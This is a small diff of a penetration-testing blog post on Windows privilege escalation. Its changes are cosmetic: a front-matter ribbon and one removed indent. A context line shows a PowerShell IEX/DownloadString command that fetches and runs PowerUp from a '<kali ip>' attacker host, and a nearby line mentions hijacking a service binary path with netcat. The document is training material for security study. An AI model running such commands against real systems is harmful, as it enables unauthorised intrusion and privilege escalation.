@@ -5,6 +5,7 @@ header:
   teaser: /assets/images/posts/pnpt/pnpt-teaser.jpg
   overlay_image: /assets/images/main/header2.jpg
   overlay_filter: 0.5
+ribbon: Firebrick
 excerpt: "Elevate and Conquer: Windows Privilege Escalation Strategies."
 description: "Navigating Windows Privesc Techniques: Kernel Exploits, Impersonation, Registry, DLL Hijacking and More "
 categories:
@@ -1192,7 +1193,7 @@ echo IEX(New-Object Net.WebClient).DownloadString('http://<kali ip>:80/PowerUp.p
 
 if u find a vulnerable service:
 ```bash
-	sc qc <service>
+sc qc <service>
 ```
 
 We can change de binary path and exploit using netcat:
